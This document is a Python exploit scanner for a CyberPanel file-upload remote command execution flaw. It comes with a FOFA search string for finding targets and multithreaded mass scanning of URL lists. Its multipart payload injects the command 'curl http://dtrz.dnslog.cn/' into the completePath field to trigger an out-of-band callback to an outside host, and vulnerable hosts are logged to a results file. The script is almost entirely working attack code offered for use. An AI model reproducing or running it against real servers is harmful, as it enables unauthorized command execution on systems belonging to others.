#Cyber Panel upload 远程命令执行
#fofa：app="CyberPanel"
import requests,argparse,sys
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def main():
    # 初始化
    parse = argparse.ArgumentParser(description="Cyber Panel upload 远程命令执行")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file')

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数做判断 输入正确 url file 输入错误弹出提示
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = [] # 用于接收读取文件之后的url
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
        
    else:
        print(f"Usage python {sys.argv[0]} -h")
def poc(target):
    link = "/filemanager/upload"
    boundary = "----NewBoundary123456789"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Connection": "close"
    }
    data = f"""--{boundary}
Content-Disposition: form-data; name="domainName"

<target>
--{boundary}
Content-Disposition: form-data; name="completePath"

curl http://dtrz.dnslog.cn/
--{boundary}
Content-Disposition: form-data; name="file"; filename="poc.txt"

pwn
--{boundary}--"""
    try:
        res1 = requests.get(url=target,headers=headers,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.post(url=target+link,headers=headers,data=data,verify=False,timeout=5)
            if res2.status_code == 200 and "error_message" in res2.text:
                print(f"[+]该{target}存在文件上传/命令执行漏洞")
                # 写入到一个文件中
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(f"[+]该{target}存在文件上传/命令执行漏洞\n")
            else:
                print(f"[-]该{target}不存在文件上传/命令执行漏洞")
    except:
        print(f"该{target}存在问题，请手工测试")
# 函数入口

if __name__ == "__main__":
    main()
